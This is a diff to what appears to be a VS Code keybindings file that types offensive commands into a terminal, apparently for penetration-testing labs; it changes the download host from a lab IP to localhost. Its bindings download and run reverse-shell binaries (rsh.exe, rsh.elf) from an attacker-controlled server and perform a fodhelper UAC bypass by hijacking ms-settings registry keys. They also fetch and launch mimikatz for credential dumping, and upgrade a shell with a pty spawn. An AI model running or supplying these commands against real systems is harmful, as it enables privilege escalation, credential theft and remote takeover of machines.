@@ -24,7 +24,7 @@
     {
       "command": {
         "action": "sendInput",
-        "input": "powershell\ninvoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile \\users\\public\\downloads\\rsh.exe\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nc:\\windows\\system32\\fodhelper.exe\n"      
+        "input": "powershell\ninvoke-webrequest -URI http://127.0.0.1/Windows/rsh.exe -Outfile \\users\\public\\downloads\\rsh.exe\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /f\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nc:\\windows\\system32\\fodhelper.exe\n"
       },
       "keys": "ctrl+shift+b"
     },
@@ -49,14 +49,14 @@
     {
       "command": {
         "action": "sendInput",
-        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
+        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/x64/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/x64/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/x64/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
       },
       "keys": "ctrl+shift+m"
     },
     {
       "command": {
         "action": "sendInput",
-        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
+        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/Win32/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/Win32/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://127.0.0.1/Windows/mimi/2.1.1/Win32/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
       },
       "keys": "ctrl+shift+n"
     },
@@ -70,16 +70,30 @@
     {
       "command": {
         "action": "sendInput",
-        "input": "stty raw -echo; fg\npython -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nstty rows 45 cols 200\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nexport PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:~/bin:~/.bin\n"
+        "input": "python -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nstty rows 45 cols 200\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nexport PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/games:/tmp:~/bin:~/.bin\n"
       },
       "keys": "ctrl+shift+p"
     },
     {
       "command": {
         "action": "sendInput",
-        "input": "wget http://192.168.119.211/Linux/rsh.elf -O /tmp/rsh\nchmod +x /tmp/rsh\n"
+        "input": "wget http://127.0.0.1/Linux/rsh.elf -O /tmp/rsh\nchmod +x /tmp/rsh\n"
       },
       "keys": "ctrl+shift+r"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "invoke-webrequest -URI http://127.0.0.1/files/toybox/toybox-x64.zip -OutFile tb.zip; expand-archive tb.zip "
+      },
+      "keys": "ctrl+shift+t"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "invoke-webrequest -URI http://127.0.0.1/files/toybox/toybox-x86.zip -OutFile tb.zip; expand-archive tb.zip "
+      },
+      "keys": "ctrl+shift+alt+t"
     },
     {
       "command": {
@@ -98,9 +112,9 @@
     {
       "command": {
         "action": "sendInput",
-        "input": "invoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile rsh.exe"
+        "input": "invoke-webrequest -URI http://127.0.0.1/Windows/rsh.exe -Outfile rsh.exe"
       },
       "keys": "ctrl+shift+alt+r"
     }
-  ]
+  ],
 }
